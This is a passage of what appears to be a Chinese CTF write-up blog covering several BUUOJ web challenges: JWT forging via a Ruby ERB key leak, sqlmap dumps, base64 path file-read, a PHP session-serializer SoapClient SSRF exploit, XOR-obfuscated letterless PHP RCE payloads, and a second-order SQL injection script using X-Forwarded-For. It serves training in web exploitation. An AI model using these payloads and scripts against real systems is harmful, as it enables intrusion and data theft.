<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030836836.png" srcset="/img/loading.gif" lazyload alt="image-20220203083649690"></p>
<p>解密结果</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span><br>&#125;<br>&#123;<br>  <span class="hljs-attr">&quot;uid&quot;</span>: <span class="hljs-string">&quot;1df4fa41-1cae-43e2-81c3-d9a856d4b2f9&quot;</span>,<br>  <span class="hljs-attr">&quot;jkl&quot;</span>: <span class="hljs-number">21</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>存在加密算法，然后就要去搞secretkey</p>
<p>这里还考察了Ruby ERB  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p>
<p>这常常与模板挂钩或者需要渲染的地方比如预览等其他功能</p>
<p>然后结合ruby的预定义变量</p>
<p><code>$&#39; The string to the right of the last successful match.</code></p>
<p>构造<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030958889.png" srcset="/img/loading.gif" lazyload alt="image-20220203095857806"></p>
<p>然后根据这个key去生成新的jwt</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031015093.png" srcset="/img/loading.gif" lazyload alt="image-20220203101545008"></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031016069.png" srcset="/img/loading.gif" lazyload alt="image-20220203101629976"></p>
<p>购买成功后flag在cookie里解密就行</p>
<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>类似一个手册站点</p>
<p>没有源码泄露应该就是sql注入了</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031050901.png" srcset="/img/loading.gif" lazyload alt="image-20220203105016822"></p>
<p>发现注入点</p>
<p>然后上sqlmap就行了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"> python sqlmap.py -u &quot;http://40beda4f-8d7b-4392-a0c3-620849fb7a1b.node4.buuoj.cn:81/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1643854704130&quot;  --dbs<br><br>python sqlmap.py -u &quot;http://40beda4f-8d7b-4392-a0c3-620849fb7a1b.node4.buuoj.cn:81/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1643854704130&quot;  -D alien_code --dump-all<br></code></pre></td></tr></table></figure>

<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>后台地址 &#x2F;admin.php</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031416156.png" srcset="/img/loading.gif" lazyload alt="image-20220203141631073"></p>
<p>用户名密码 admin &#x2F; 12345</p>
<p>在导出主题的部分 发现文件下载的链接</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin.php?m=ui&amp;f=downloadtheme&amp;theme=L<span class="hljs-number">3</span>Zhci<span class="hljs-number">93</span>d<span class="hljs-number">3</span>cvaHRtbC<span class="hljs-number">9</span>zeXN<span class="hljs-number">0</span>ZW<span class="hljs-number">0</span>vdG<span class="hljs-number">1</span>wL<span class="hljs-number">3</span>RoZW<span class="hljs-number">1</span>lL<span class="hljs-number">2</span>RlZmF<span class="hljs-number">1</span>bHQvMS<span class="hljs-number">56</span>aXA=<br></code></pre></td></tr></table></figure>

<p>后面这个theme的内容为 &#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;1.zip</p>
<p>重新构造</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">m</span>=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<br></code></pre></td></tr></table></figure>

<p>解码结果 &#x2F;flag</p>
<p>成功获取flag</p>
<h2 id="LCTF2018-bestphp’s-revenge"><a href="#LCTF2018-bestphp’s-revenge" class="headerlink" title="[LCTF2018]bestphp’s revenge"></a>[LCTF2018]bestphp’s revenge</h2><p>这篇文章写的很好了 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1376384">https://cloud.tencent.com/developer/article/1376384</a></p>
<p>下面是</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br>call_user_func(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br>var_dump(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(reset(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br>call_user_func(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">only localhost can <span class="hljs-builtin-name">get</span> flag!session_start(); echo <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>; <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>; &#125; only localhost can <span class="hljs-builtin-name">get</span> flag!<br></code></pre></td></tr></table></figure>

<p>​    这里 $_SERVER[“REMOTE_ADDR”]&#x3D;&#x3D;&#x3D;”127.0.0.1” 暗示了要用Soap原生类来解决</p>
<p>这里还需要提一下PHP使用不同引擎可能会造成反序列化问题</p>
<table>
<thead>
<tr>
<th>php_serialize</th>
<th>经过serialize()函数序列化数组</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过serialize()函数处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ascii字符+键名+serialize()函数序列化的值</td>
</tr>
</tbody></table>
<p>demo:</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//name|s:4:&quot;test&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>php_serialize</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>php_binary</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">//&lt;0x04&gt;names:4:&quot;test&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>如果session内容可控 让它变为 <code>|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code></p>
<p>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a:<span class="hljs-number">1</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;|O:5:&quot;</span>Smi1e<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:3:&quot;</span>AAA<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>而反序列化引擎如果使用的是php，就会把<code>|</code>作为作为key和value的分隔符。把<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p>
<p>那怎么替换他的引擎？这里</p>
<p>​    思路是这样：改session引擎成php_serliaze &#x3D;&gt; Soapclient </p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span>(<br><br>        <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;test\r\nCookie:PHPSESSID=11111111111111111111111111&quot;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>,<br>        <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span><br>    )<br>);<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode(<span class="hljs-variable">$b</span>);<br><br><br></code></pre></td></tr></table></figure>

<p>改引擎传入soap的序列化内容</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051850090.png" srcset="/img/loading.gif" lazyload alt="image-20220205185044964"></p>
<p>这里构造的目的是</p>
<p><code>session_start</code></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051851566.png" srcset="/img/loading.gif" lazyload alt="image-20220205185122442"></p>
<p>这一步，构造</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">call<span class="hljs-constructor">_user_func(<span class="hljs-params">extract</span>(<span class="hljs-params">b</span>=<span class="hljs-params">call_user_func</span>)</span>)<br>call<span class="hljs-constructor">_user_func(<span class="hljs-params">call_user_func</span>,<span class="hljs-params">array</span>($<span class="hljs-params">_session</span>,‘<span class="hljs-params">welcome_to_the_lctf2018</span>)</span>)<br>然后call_user_func发现自己接受到一个数组就会去找 $session这个的对象的 &#x27;welcome_to_the_lctf2018&#x27; 这个方法 于是调用到 _call方法度 Soapclinet去访问flag.php<br></code></pre></td></tr></table></figure>



<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051855445.png" srcset="/img/loading.gif" lazyload alt="image-20220205185523333"></p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>无字母rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><span class="hljs-comment">//使用的不重复字符串&lt;=13</span><br><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>先看看phpinfo 这里可以url编码取反绕过</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">php &gt; var_dump(urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>));<br>string(<span class="hljs-number">21</span>) <span class="hljs-string">&quot;%8F%97%8F%96%91%99%90&quot;</span><br></code></pre></td></tr></table></figure>

<p>然后用括号包起来 <code>?_=(~%8F%97%8F%96%91%99%90)();</code></p>
<p>phpinfo显示禁用了如下函数</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-built_in">exec</span>,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open<br></code></pre></td></tr></table></figure>

<p>然后扫描一下目录</p>
<p>可以通过 print_r(scandir(.)) 来 但是 这样不同字符串的长度超过13 ，然后就需要减长度，那可以让 相同的字母取不同的字符异或</p>
<p>有脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">string=<span class="hljs-string">&#x27;.prints()and;&#x27;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> string:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> string:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(a)^<span class="hljs-built_in">ord</span>(b)^<span class="hljs-built_in">ord</span>(c)==<span class="hljs-built_in">ord</span>(m):<br>                    <span class="hljs-keyword">if</span> a==b==c:<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(a+<span class="hljs-string">&#x27;=&#x27;</span>+(a)+<span class="hljs-string">&#x27;^&#x27;</span>+(b)+<span class="hljs-string">&#x27;^&#x27;</span>+(c))<br></code></pre></td></tr></table></figure>

<p>回头看这条语句 print_r(scandir(.))</p>
<p>假设去掉  rnt  找上面脚本的输出结果</p>
<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="xml">t = s</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^d</span><span class="xml"> 也就是 s</span><span class="hljs-keyword">^0xff</span><span class="xml">   c</span><span class="hljs-keyword">^0xff</span><span class="xml">   d</span><span class="hljs-keyword">^0xff</span><span class="xml"> </span><br><span class="xml">n = i</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^d</span><span class="xml"> 同理</span><br><span class="xml">r = a</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^p</span><br></code></pre></td></tr></table></figure>

<p>然后我们对原先的字符串进行替换</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">print_r(scandir(.))<br>print_r 有三部分组成的异或等式 先直接替换 (tnr<span class="hljs-operator">=</span>&gt;sia) 然后剩下两组相互异或 (<span class="hljs-keyword">ccc</span>^ddp) 见上脚本结果<br>paiis_a <span class="hljs-operator">=</span>&gt;(<span class="hljs-variable">%8</span>F<span class="hljs-variable">%9</span>E<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>E)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br><span class="hljs-keyword">ccc</span>^ddd(找替换的字符的位置再进行替换)<span class="hljs-operator">=</span>&gt;(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)<br>print_r<span class="hljs-operator">=</span>&gt;paiis_a ^(<span class="hljs-keyword">ccc</span>^ddd) <span class="hljs-operator">=</span>&gt;<br>((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span>e<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f))<br>scandir()<span class="hljs-operator">=</span>&gt; 同理<br>((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f))<br></code></pre></td></tr></table></figure>

<p>综合 </p>
<p><code>?_=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));</code></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202052355031.png" srcset="/img/loading.gif" lazyload alt="image-20220205235557912"></p>
<p>找到文件名，这个时候发现文件名很长，可以借助php对数组的操作 end() 将指针指向最后一个单元</p>
<p>于是目的变为 <code>show_source(end(scandir(.)));</code></p>
<p>最终payload</p>
<p><code>?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>这居然是sql注入 hhh</p>
<p>借用一下赵总的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://node4.buuoj.cn:28893/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_sql</span>(<span class="hljs-params">sql</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]请求语句：&quot;</span> + sql)<br>    return_result = <span class="hljs-string">&quot;&quot;</span><br><br>    payload = <span class="hljs-string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="hljs-string">&quot;))|&#x27;0&quot;</span><br>    session = requests.session()<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)<br>    r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)<br>    start_pos = r.text.find(<span class="hljs-string">&quot;Last Ip: &quot;</span>)<br>    end_pos = r.text.find(<span class="hljs-string">&quot; --&gt;&quot;</span>, start_pos)<br>    length = <span class="hljs-built_in">int</span>(r.text[start_pos + <span class="hljs-number">9</span>: end_pos])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]长度：&quot;</span> + <span class="hljs-built_in">str</span>(length))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;|conv(hex(substr((&quot;</span> + sql + <span class="hljs-string">&quot;),&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;,5)),16,10)|&#x27;0&quot;</span><br><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;) <span class="hljs-comment"># 将语句注入</span><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)    <span class="hljs-comment"># 查询上次IP时触发二次注入</span><br>        r = session.get(target, headers=&#123;<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;glzjin&#x27;</span>&#125;)    <span class="hljs-comment"># 再次查询得到结果</span><br>        start_pos = r.text.find(<span class="hljs-string">&quot;Last Ip: &quot;</span>)<br>        end_pos = r.text.find(<span class="hljs-string">&quot; --&gt;&quot;</span>, start_pos)<br>        result = <span class="hljs-built_in">int</span>(r.text[start_pos + <span class="hljs-number">9</span>: end_pos])<br>        return_result += <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(result)[<span class="hljs-number">2</span>:]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]位置 &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; 请求五位成功:&quot;</span> + <span class="hljs-built_in">bytes</span>.fromhex(<span 